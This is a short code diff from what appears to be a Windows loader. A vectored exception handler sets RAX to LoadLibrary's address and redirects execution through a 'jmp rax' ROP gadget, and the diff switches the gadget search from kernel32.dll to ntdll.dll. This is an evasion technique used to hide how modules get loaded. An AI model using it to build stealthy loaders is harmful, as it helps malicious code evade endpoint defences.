@@ -40,7 +40,7 @@ LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
         ExceptionInfo->ContextRecord->Rax = (DWORD64)loadLibraryAddr;
 
         // Jump to RAX via ROP Gadget
-        PVOID pNtdll = GetModuleHandleA("kernel32.dll");
+        PVOID pNtdll = GetModuleHandleA("ntdll.dll");
         PVOID pJmpRaxGadget = FindGadget(pNtdll, fnGadgetJmpRax);
         ExceptionInfo->ContextRecord->Rip = (DWORD64)pJmpRaxGadget;
 
